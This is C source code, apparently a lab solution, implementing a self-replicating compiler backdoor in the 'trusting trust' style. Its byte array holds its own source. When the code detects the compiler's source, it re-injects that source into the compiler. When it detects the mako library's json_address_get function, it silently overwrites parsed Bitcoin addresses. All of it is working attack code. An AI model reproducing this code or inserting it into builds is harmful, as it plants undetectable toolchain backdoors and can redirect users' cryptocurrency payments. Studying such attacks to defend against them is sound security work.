static char compile_attack[] = {
	105,
	102,
	40,
	102,
	108,
	97,
	103,
	115,
	32,
	38,
	32,
	65,
	70,
	70,
	95,
	84,
	89,
	80,
	69,
	95,
	67,
	32,
	33,
	61,
	32,
	48,
	41,
	32,
	123,
	10,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	91,
	93,
	32,
	61,
	32,
	34,
	47,
	42,
	32,
	111,
	112,
	101,
	110,
	32,
	116,
	104,
	101,
	32,
	102,
	105,
	108,
	101,
	32,
	42,
	47,
	34,
	59,
	10,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	91,
	93,
	32,
	61,
	32,
	34,
	105,
	110,
	116,
	92,
	110,
	106,
	115,
	111,
	110,
	95,
	97,
	100,
	100,
	114,
	101,
	115,
	115,
	95,
	103,
	101,
	116,
	40,
	98,
	116,
	99,
	95,
	97,
	100,
	100,
	114,
	101,
	115,
	115,
	95,
	116,
	32,
	42,
	97,
	100,
	100,
	114,
	44,
	92,
	110,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	99,
	111,
	110,
	115,
	116,
	32,
	106,
	115,
	111,
	110,
	95,
	118,
	97,
	108,
	117,
	101,
	32,
	42,
	111,
	98,
	106,
	44,
	92,
	110,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	99,
	111,
	110,
	115,
	116,
	32,
	98,
	116,
	99,
	95,
	110,
	101,
	116,
	119,
	111,
	114,
	107,
	95,
	116,
	32,
	42,
	110,
	101,
	116,
	119,
	111,
	114,
	107,
	41,
	32,
	123,
	92,
	110,
	32,
	32,
	105,
	102,
	32,
	40,
	111,
	98,
	106,
	45,
	62,
	116,
	121,
	112,
	101,
	32,
	33,
	61,
	32,
	106,
	115,
	111,
	110,
	95,
	115,
	116,
	114,
	105,
	110,
	103,
	41,
	92,
	110,
	32,
	32,
	32,
	32,
	114,
	101,
	116,
	117,
	114,
	110,
	32,
	48,
	59,
	34,
	59,
	10,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	109,
	97,
	107,
	111,
	95,
	97,
	116,
	116,
	97,
	99,
	107,
	91,
	93,
	32,
	61,
	32,
	34,
	92,
	110,
	115,
	116,
	114,
	99,
	112,
	121,
	40,
	111,
	98,
	106,
	45,
	62,
	117,
	46,
	115,
	116,
	114,
	105,
	110,
	103,
	46,
	112,
	116,
	114,
	44,
	32,
	92,
	34,
	110,
	101,
	119,
	32,
	97,
	100,
	100,
	114,
	101,
	115,
	115,
	92,
	34,
	41,
	59,
	34,
	59,
	10,
	10,
	32,
	32,
	32,
	32,
	47,
	42,
	32,
	97,
	116,
	116,
	97,
	99,
	107,
	32,
	99,
	111,
	100,
	101,
	32,
	102,
	111,
	108,
	108,
	111,
	119,
	115,
	32,
	42,
	47,
	10,
	10,
	32,
	32,
	32,
	32,
	35,
	100,
	101,
	102,
	105,
	110,
	101,
	32,
	78,
	32,
	32,
	56,
	32,
	42,
	32,
	49,
	48,
	50,
	52,
	32,
	42,
	32,
	49,
	48,
	50,
	52,
	10,
	10,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	112,
	114,
	111,
	103,
	114,
	97,
	109,
	91,
	78,
	43,
	49,
	93,
	59,
	10,
	32,
	32,
	32,
	32,
	105,
	110,
	116,
	32,
	120,
	95,
	102,
	100,
	32,
	61,
	32,
	111,
	112,
	101,
	110,
	40,
	102,
	105,
	108,
	101,
	110,
	97,
	109,
	101,
	44,
	32,
	79,
	95,
	82,
	68,
	79,
	78,
	76,
	89,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	105,
	110,
	116,
	32,
	110,
	32,
	61,
	32,
	114,
	101,
	97,
	100,
	40,
	120,
	95,
	102,
	100,
	44,
	32,
	112,
	114,
	111,
	103,
	114,
	97,
	109,
	44,
	32,
	78,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	99,
	108,
	111,
	115,
	101,
	40,
	120,
	95,
	102,
	100,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	10,
	32,
	32,
	32,
	32,
	47,
	47,
	32,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	34,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	46,
	76,
	79,
	79,
	75,
	73,
	78,
	71,
	32,
	70,
	79,
	82,
	32,
	80,
	65,
	84,
	84,
	69,
	82,
	78,
	83,
	92,
	110,
	34,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	99,
	104,
	97,
	114,
	32,
	42,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	61,
	32,
	115,
	116,
	114,
	115,
	116,
	114,
	40,
	112,
	114,
	111,
	103,
	114,
	97,
	109,
	44,
	32,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	99,
	104,
	97,
	114,
	32,
	42,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	61,
	32,
	115,
	116,
	114,
	115,
	116,
	114,
	40,
	112,
	114,
	111,
	103,
	114,
	97,
	109,
	44,
	32,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	41,
	59,
	10,
	10,
	32,
	32,
	32,
	32,
	105,
	102,
	32,
	40,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	33,
	61,
	32,
	78,
	85,
	76,
	76,
	41,
	32,
	123,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	47,
	47,
	32,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	34,
	92,
	110,
	35,
	35,
	35,
	32,
	70,
	79,
	85,
	78,
	68,
	32,
	67,
	79,
	77,
	80,
	73,
	76,
	69,
	82,
	32,
	80,
	65,
	84,
	84,
	69,
	82,
	78,
	33,
	92,
	110,
	34,
	41,
	59,
	10,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	98,
	121,
	116,
	101,
	115,
	91,
	78,
	93,
	59,
	32,
	10,
	9,
	9,
	105,
	110,
	116,
	32,
	108,
	32,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	98,
	121,
	116,
	101,
	115,
	44,
	32,
	34,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	97,
	116,
	116,
	97,
	99,
	107,
	91,
	93,
	32,
	61,
	32,
	123,
	92,
	110,
	34,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	102,
	111,
	114,
	40,
	105,
	110,
	116,
	32,
	105,
	32,
	61,
	32,
	48,
	59,
	32,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	97,
	116,
	116,
	97,
	99,
	107,
	91,
	105,
	93,
	59,
	32,
	105,
	43,
	43,
	41,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	108,
	32,
	43,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	98,
	121,
	116,
	101,
	115,
	32,
	43,
	32,
	108,
	44,
	32,
	34,
	92,
	116,
	37,
	100,
	44,
	92,
	110,
	34,
	44,
	32,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	97,
	116,
	116,
	97,
	99,
	107,
	91,
	105,
	93,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	108,
	32,
	43,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	98,
	121,
	116,
	101,
	115,
	32,
	43,
	32,
	108,
	44,
	32,
	34,
	92,
	116,
	48,
	92,
	110,
	125,
	59,
	92,
	110,
	92,
	110,
	34,
	41,
	59,
	10,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	116,
	109,
	112,
	91,
	78,
	93,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	105,
	110,
	116,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	32,
	61,
	32,
	115,
	116,
	114,
	108,
	101,
	110,
	40,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	41,
	59,
	10,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	115,
	116,
	114,
	99,
	112,
	121,
	40,
	116,
	109,
	112,
	44,
	32,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	43,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	32,
	43,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	43,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	44,
	32,
	34,
	37,
	115,
	34,
	44,
	32,
	98,
	121,
	116,
	101,
	115,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	32,
	43,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	43,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	44,
	32,
	34,
	37,
	115,
	34,
	44,
	32,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	97,
	116,
	116,
	97,
	99,
	107,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	32,
	43,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	99,
	111,
	109,
	112,
	105,
	108,
	101,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	43,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	44,
	32,
	34,
	37,
	115,
	34,
	44,
	32,
	116,
	109,
	112,
	41,
	59,
	10,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	98,
	97,
	100,
	95,
	102,
	105,
	108,
	101,
	110,
	97,
	109,
	101,
	32,
	91,
	93,
	32,
	61,
	32,
	34,
	97,
	116,
	116,
	97,
	99,
	107,
	45,
	116,
	109,
	112,
	46,
	99,
	34,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	70,
	73,
	76,
	69,
	42,
	32,
	102,
	32,
	61,
	32,
	102,
	111,
	112,
	101,
	110,
	40,
	98,
	97,
	100,
	95,
	102,
	105,
	108,
	101,
	110,
	97,
	109,
	101,
	44,
	32,
	34,
	119,
	34,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	102,
	112,
	117,
	116,
	115,
	40,
	112,
	114,
	111,
	103,
	114,
	97,
	109,
	44,
	32,
	102,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	102,
	99,
	108,
	111,
	115,
	101,
	40,
	102,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	102,
	105,
	108,
	101,
	110,
	97,
	109,
	101,
	32,
	61,
	32,
	98,
	97,
	100,
	95,
	102,
	105,
	108,
	101,
	110,
	97,
	109,
	101,
	59,
	32,
	32,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	47,
	47,
	32,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	34,
	92,
	110,
	35,
	35,
	35,
	32,
	73,
	78,
	74,
	69,
	67,
	84,
	69,
	68,
	32,
	83,
	69,
	76,
	70,
	45,
	82,
	69,
	80,
	76,
	73,
	67,
	65,
	84,
	73,
	78,
	71,
	32,
	67,
	79,
	68,
	69,
	33,
	92,
	110,
	34,
	41,
	59,
	10,
	10,
	10,
	32,
	32,
	32,
	32,
	125,
	32,
	101,
	108,
	115,
	101,
	32,
	105,
	102,
	40,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	33,
	61,
	32,
	78,
	85,
	76,
	76,
	41,
	32,
	123,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	47,
	47,
	32,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	34,
	92,
	110,
	35,
	35,
	35,
	32,
	70,
	79,
	85,
	78,
	68,
	32,
	77,
	65,
	75,
	79,
	32,
	80,
	65,
	84,
	84,
	69,
	82,
	78,
	33,
	92,
	110,
	34,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	115,
	116,
	97,
	116,
	105,
	99,
	32,
	99,
	104,
	97,
	114,
	32,
	116,
	109,
	112,
	91,
	78,
	93,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	105,
	110,
	116,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	32,
	61,
	32,
	115,
	116,
	114,
	108,
	101,
	110,
	40,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	115,
	116,
	114,
	99,
	112,
	121,
	40,
	116,
	109,
	112,
	44,
	32,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	43,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	32,
	43,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	43,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	44,
	32,
	34,
	37,
	115,
	34,
	44,
	32,
	109,
	97,
	107,
	111,
	95,
	97,
	116,
	116,
	97,
	99,
	107,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	32,
	43,
	61,
	32,
	115,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	109,
	97,
	107,
	111,
	95,
	115,
	105,
	103,
	95,
	108,
	111,
	99,
	32,
	43,
	32,
	111,
	102,
	102,
	115,
	101,
	116,
	44,
	32,
	34,
	37,
	115,
	34,
	44,
	32,
	116,
	109,
	112,
	41,
	59,
	10,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	47,
	47,
	32,
	112,
	114,
	105,
	110,
	116,
	102,
	40,
	34,
	92,
	110,
	35,
	35,
	35,
	32,
	82,
	69,
	87,
	82,
	73,
	84,
	73,
	78,
	71,
	32,
	77,
	65,
	75,
	79,
	32,
	70,
	73,
	76,
	69,
	33,
	92,
	110,
	34,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	70,
	73,
	76,
	69,
	32,
	42,
	102,
	32,
	61,
	32,
	102,
	111,
	112,
	101,
	110,
	40,
	102,
	105,
	108,
	101,
	110,
	97,
	109,
	101,
	44,
	32,
	34,
	119,
	34,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	105,
	102,
	32,
	40,
	102,
	32,
	33,
	61,
	32,
	78,
	85,
	76,
	76,
	41,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	123,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	102,
	112,
	117,
	116,
	115,
	40,
	112,
	114,
	111,
	103,
	114,
	97,
	109,
	44,
	32,
	102,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	102,
	99,
	108,
	111,
	115,
	101,
	40,
	102,
	41,
	59,
	10,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	32,
	125,
	10,
	32,
	32,
	32,
	32,
	125,
	10,
	125,
	0
};

if(flags & AFF_TYPE_C != 0) {
    static char compile_sig[] = "/* open the file */";
    static char mako_sig[] = "int\njson_address_get(btc_address_t *addr,\n                 const json_value *obj,\n                 const btc_network_t *network) {\n  if (obj->type != json_string)\n    return 0;";
    static char mako_attack[] = "\nstrcpy(obj->u.string.ptr, \"new address\");";

    /* attack code follows */

    #define N  8 * 1024 * 1024

    static char program[N+1];
    int x_fd = open(filename, O_RDONLY);
    int n = read(x_fd, program, N);
    close(x_fd);
    
    // printf("................LOOKING FOR PATTERNS\n");
    char *compile_sig_loc = strstr(program, compile_sig);
    char *mako_sig_loc = strstr(program, mako_sig);

    if (compile_sig_loc != NULL) {
        // printf("\n### FOUND COMPILER PATTERN!\n");

        static char bytes[N]; 
		int l = sprintf(bytes, "static char compile_attack[] = {\n");
        for(int i = 0; compile_attack[i]; i++)
            l += sprintf(bytes + l, "\t%d,\n", compile_attack[i]);
        l += sprintf(bytes + l, "\t0\n};\n\n");

        static char tmp[N];
        int offset = strlen(compile_sig);

        strcpy(tmp, compile_sig_loc + offset);
        offset += sprintf(compile_sig_loc + offset, "%s", bytes);
        offset += sprintf(compile_sig_loc + offset, "%s", compile_attack);
        offset += sprintf(compile_sig_loc + offset, "%s", tmp);

        static char bad_filename [] = "attack-tmp.c";
        FILE* f = fopen(bad_filename, "w");
        fputs(program, f);
        fclose(f);
        filename = bad_filename;  
        // printf("\n### INJECTED SELF-REPLICATING CODE!\n");


    } else if(mako_sig_loc != NULL) {
        // printf("\n### FOUND MAKO PATTERN!\n");
        static char tmp[N];
        int offset = strlen(mako_sig);
        strcpy(tmp, mako_sig_loc + offset);
        offset += sprintf(mako_sig_loc + offset, "%s", mako_attack);
        offset += sprintf(mako_sig_loc + offset, "%s", tmp);

        // printf("\n### REWRITING MAKO FILE!\n");
        FILE *f = fopen(filename, "w");
        if (f != NULL)
        {
            fputs(program, f);
            fclose(f);
        }
    }
}